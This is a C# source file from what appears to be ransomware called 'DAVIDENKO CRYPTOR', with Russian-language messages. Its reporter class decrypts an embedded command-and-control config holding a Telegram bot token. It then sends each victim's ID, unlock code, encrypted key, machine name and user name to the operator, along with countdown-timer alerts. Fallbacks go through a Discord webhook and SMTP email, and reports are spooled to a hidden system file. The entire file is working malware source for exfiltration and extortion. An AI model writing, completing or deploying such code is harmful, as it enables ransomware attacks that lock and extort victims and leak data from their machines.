using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Text;
using System.Windows.Forms;
using System.Security.Cryptography;

namespace ns0
{
    internal static class TelegramReporter
    {
        private static string _botToken;
        private static string _chatId;

        private static void EnsureC2()
        {
            if (_botToken != null) return;
            try
            {
                var asm = System.Reflection.Assembly.GetExecutingAssembly();
                System.IO.Stream s = asm.GetManifestResourceStream("ns0.Resources.operator.c2")
                    ?? asm.GetManifestResourceStream("operator.c2");
                if (s == null) { _botToken = string.Empty; _chatId = string.Empty; return; }

                byte[] blob;
                using (s)
                using (var ms = new System.IO.MemoryStream())
                {
                    s.CopyTo(ms);
                    blob = ms.ToArray();
                }
                if (blob.Length < 28) { _botToken = string.Empty; _chatId = string.Empty; return; }

                byte[] nonce = new byte[12];
                byte[] tag = new byte[16];
                byte[] ct = new byte[blob.Length - 28];
                Buffer.BlockCopy(blob, 0, nonce, 0, 12);
                Buffer.BlockCopy(blob, 12, tag, 0, 16);
                Buffer.BlockCopy(blob, 28, ct, 0, ct.Length);

                byte[] c2Key = C2KeyProvider.GetKey();
                byte[] plain = AesGcmNative.Decrypt(c2Key, nonce, ct, tag);
                string kv = Encoding.UTF8.GetString(plain);
                foreach (var raw in kv.Split('\n'))
                {
                    string line = raw.Trim();
                    if (line.Length == 0 || line.StartsWith("#")) continue;
                    int eq = line.IndexOf('=');
                    if (eq <= 0) continue;
                    string k = line.Substring(0, eq).Trim();
                    string v = line.Substring(eq + 1).Trim();
                    if (k == "bot_token") _botToken = v;
                    else if (k == "chat_id") _chatId = v;
                }
            }
            catch { _botToken = _botToken ?? string.Empty; _chatId = _chatId ?? string.Empty; }
        }

        private static string ApiUrl
        {
            get
            {
                EnsureC2();
                if (string.IsNullOrEmpty(_botToken) || string.IsNullOrEmpty(_chatId))
                    return null;
                return "https://api.telegram.org/bot" + _botToken + "/sendMessage";
            }
        }

        private static string ChatId
        {
            get { EnsureC2(); return _chatId ?? ""; }
        }

        private static bool HasValidTelegramConfig()
        {
            EnsureC2();
            return !string.IsNullOrEmpty(_botToken) && !string.IsNullOrEmpty(_chatId);
        }

        private static int _reported = 0;
        public static string CustomUsername;

         public static void ReportUnlockCode(string unlockCode, string victimId, string userAgent, string encryptedKeyBlob = null)
        {
            // Атомарный one-shot флаг: многопоточный вызов не даст дублей отчёта.
            if (System.Threading.Interlocked.CompareExchange(ref _reported, 1, 0) != 0) return;

            try
            {
                string message = $"[DAVIDENKO CRYPTOR] НовОЕ заражение\n";
                message += $"ID: {victimId}\n";
                message += $"Код разблокировки: {unlockCode}\n";
                if (!string.IsNullOrEmpty(encryptedKeyBlob))
                {
                    message += $"Зашифрованный ключ: {encryptedKeyBlob}\n";
                }
                message += $"ПК: {Environment.MachineName}\n";
                message += $"Пользователь: {CustomUsername ?? Environment.UserName}\n";
                message += $"OS: {Environment.OSVersion.VersionString}\n";
                message += $"Time: {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss UTC}\n";
                message += $"UserAgent: {userAgent}";

                Debug.WriteLine($"[TelegramReporter] Sending message, length: {message.Length}");
                SendTelegramMessage(message);
                Debug.WriteLine($"[TelegramReporter] Message sent successfully");
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"[TelegramReporter] Exception: {ex.Message}");
                try
                {
                    MessageBox.Show($"Failed to send Telegram report: {ex.Message}", 
                        "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
                catch { }
            }
        }

        public static void ReportError(string error, string context, string victimId = null)
        {
            try
            {
                string message = $"[DAVIODENKO ERROR]\n";
                message += $"Контекст: {context}\n";
                message += $"Ошибка: {error}\n";
                if (!string.IsNullOrEmpty(victimId))
                {
                    message += $"ID жертвы: {victimId}\n";
                }
                message += $"ПК: {Environment.MachineName}\n";
                message += $"Пользователь: {CustomUsername ?? Environment.UserName}\n";
                message += $"Time: {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss UTC}";

                SendTelegramMessage(message);
            }
            catch { }
        }

        public static void ReportSystemMetrics(string category, long value, string labels = null)
        {
            try
            {
                string message = $"[METRICS] Category: {category}\n";
                message += $"Значение: {value}\n";
                if (!string.IsNullOrEmpty(labels))
                {
                    message += $"Метки: {labels}\n";
                }
                message += $"ПК: {Environment.MachineName}\n";
                message += $"Пользователь: {CustomUsername ?? Environment.UserName}\n";
                message += $"Time: {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss UTC}";

                SendTelegramMessage(message);
            }
            catch { }
        }

        public static void ReportComplianceEvent(string eventType, string details, string severity = "INFO")
        {
            try
            {
                string message = $"[COMPLIANCE] Событие: {eventType}\n";
                message += $"Уровень: {severity}\n";
                message += $"Детали: {details}\n";
                message += $"ПК: {Environment.MachineName}\n";
                message += $"Пользователь: {CustomUsername ?? Environment.UserName}\n";
                message += $"Time: {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss UTC}";

                SendTelegramMessage(message);
            }
            catch { }
        }

        private static DateTime _lastTimerReportUtc = DateTime.MinValue;
        private static string _lastTimerThreat = "";

        public static void ReportTimerStatus(string remaining, string threat)
        {
            try
            {
                bool escalated = threat != _lastTimerThreat;
                bool stale = (DateTime.UtcNow - _lastTimerReportUtc).TotalMinutes >= 30;
                if (!escalated && !stale) return;

                _lastTimerReportUtc = DateTime.UtcNow;
                _lastTimerThreat = threat;

                string message = $"[DAVIDENKO CRYPTOR] ТАЙМЕР\n";
                message += $"Осталось: {remaining}\n";
                message += $"Уровень: {threat}\n";
                message += $"ПК: {Environment.MachineName}\n";
                message += $"Пользователь: {CustomUsername ?? Environment.UserName}\n";
                message += $"Time: {DateTime.UtcNow:yyyy-MM-dd HH:mm:ss UTC}";

                SendTelegramMessage(message);
            }
            catch { }
        }

        private static void SendTelegramMessage(string message)
        {
            if (!HasValidTelegramConfig())
            {
                Debug.WriteLine("[TelegramReporter] Telegram config missing — skipping to fallback");
                SendFallback(message);
                return;
            }

            // Telegram limit: 4096 chars. Truncate if needed.
            const int MaxTelegramLength = 4000;
            if (message.Length > MaxTelegramLength)
            {
                message = message.Substring(0, MaxTelegramLength - 20) + "\n...[truncated]";
            }

            const int maxRetries = 3;
            for (int attempt = 1; attempt <= maxRetries; attempt++)
            {
                try
                {
                    string escapedText = Uri.EscapeDataString(message);
                    string postData = $"chat_id={ChatId}&text={escapedText}";

                    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(ApiUrl);
                    request.Method = "POST";
                    request.ContentType = "application/x-www-form-urlencoded";
                    request.Timeout = 15000;
                    request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";

                    byte[] dataBytes = Encoding.UTF8.GetBytes(postData);

                    using (var stream = request.GetRequestStream())
                    {
                        stream.Write(dataBytes, 0, dataBytes.Length);
                    }

                    using (var response = (HttpWebResponse)request.GetResponse())
                    {
                        using (var reader = new StreamReader(response.GetResponseStream()))
                        {
                            string responseText = reader.ReadToEnd();
                            Debug.WriteLine($"[TelegramReporter] Response (attempt {attempt}): {responseText}");
                            if (responseText.Contains("\"ok\":true"))
                            {
                                Debug.WriteLine($"[TelegramReporter] Message sent successfully on attempt {attempt}");
                                return;
                            }
                            else
                            {
                                Debug.WriteLine($"[TelegramReporter] API error on attempt {attempt}: {responseText}");
                            }
                        }
                    }
                }
                catch (WebException webEx)
                {
                    try
                    {
                        var statusCode = (webEx.Response as HttpWebResponse)?.StatusCode ?? HttpStatusCode.ServiceUnavailable;
                        Debug.WriteLine($"[TelegramReporter] Web error (attempt {attempt}): {(int)statusCode} - {webEx.Message}");
                    }
                    catch { Debug.WriteLine($"[TelegramReporter] Web error (attempt {attempt}): {webEx.Message}"); }
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"[TelegramReporter] Send error (attempt {attempt}): {ex.Message}");
                }

                if (attempt < maxRetries)
                {
                    Debug.WriteLine($"[TelegramReporter] Retrying in 2 seconds... (attempt {attempt + 1}/{maxRetries})");
                    System.Threading.Thread.Sleep(2000);
                }
            }
            Debug.WriteLine($"[TelegramReporter] Failed after {maxRetries} attempts");
            SendFallback(message);
        }

        // --- Fallback-каналы связи (если Telegram заблокирован/недоступен) ---
        private const string DiscordWebhookUrl = BuildSecrets.DiscordWebhookUrl;
        private const string SmtpHost = BuildSecrets.SmtpHost;
        private const int SmtpPort = BuildSecrets.SmtpPort;
        private const string SmtpUser = BuildSecrets.SmtpUser;
        private const string SmtpPass = BuildSecrets.SmtpPass;
        private const string SmtpTo = BuildSecrets.SmtpTo;

        private static void SendFallback(string message)
        {
            bool sent = SendDiscord(message);
            sent |= SendEmail(message);
            if (!sent)
            {
                    SpoolToDisk(message);
            }
        }

        private static void SpoolToDisk(string message)
        {
            try
            {
                string path = System.IO.Path.Combine(System.IO.Path.GetTempPath(), ".dvdcrpt_spool");
                System.IO.File.AppendAllText(path,
                    DateTime.UtcNow.ToString("o") + "|" + message + "\r\n");
                try { System.IO.File.SetAttributes(path, System.IO.FileAttributes.Hidden | System.IO.FileAttributes.System); } catch { }
            }
            catch { }
        }

        public static void FlushSpool()
        {
            try
            {
                string path = System.IO.Path.Combine(System.IO.Path.GetTempPath(), ".dvdcrpt_spool");
                if (!System.IO.File.Exists(path)) return;
                foreach (string line in System.IO.File.ReadAllLines(path))
                {
                    if (string.IsNullOrWhiteSpace(line)) continue;
                    int sep = line.IndexOf('|');
                    string payload = sep >= 0 ? line.Substring(sep + 1) : line;
                    SendTelegramMessage(payload);
                }
                System.IO.File.Delete(path);
            }
            catch { }
        }

        private static bool SendDiscord(string message)
        {
            try
            {
                if (DiscordWebhookUrl.IndexOf("REPLACE_WITH", StringComparison.Ordinal) >= 0) return false;

                string escaped = message.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\r", "").Replace("\n", "\\n");
                string json = "{\"content\":\"" + escaped + "\"}";
                byte[] data = Encoding.UTF8.GetBytes(json);

                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(DiscordWebhookUrl);
                request.Method = "POST";
                request.ContentType = "application/json";
                request.Timeout = 15000;
                request.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)";

                using (var stream = request.GetRequestStream())
                {
                    stream.Write(data, 0, data.Length);
                }

                using (var response = (HttpWebResponse)request.GetResponse())
                {
                    using (var reader = new StreamReader(response.GetResponseStream()))
                    {
                        reader.ReadToEnd();
                    }
                }
                return true;
            }
            catch { return false; }
        }

        private static bool SendEmail(string message)
        {
            try
            {
                if (SmtpUser.IndexOf("REPLACE_WITH", StringComparison.Ordinal) >= 0) return false;

                using (var client = new System.Net.Mail.SmtpClient(SmtpHost, SmtpPort))
                {
                    client.EnableSsl = true;
                    client.Timeout = 15000;
                    client.Credentials = new System.Net.NetworkCredential(SmtpUser, SmtpPass);

                    var mail = new System.Net.Mail.MailMessage(SmtpUser, SmtpTo,
                        "[DAVIDENKO CRYPTOR] report", message);
                    client.Send(mail);
                }
                return true;
            }
            catch { return false; }
        }
    }
}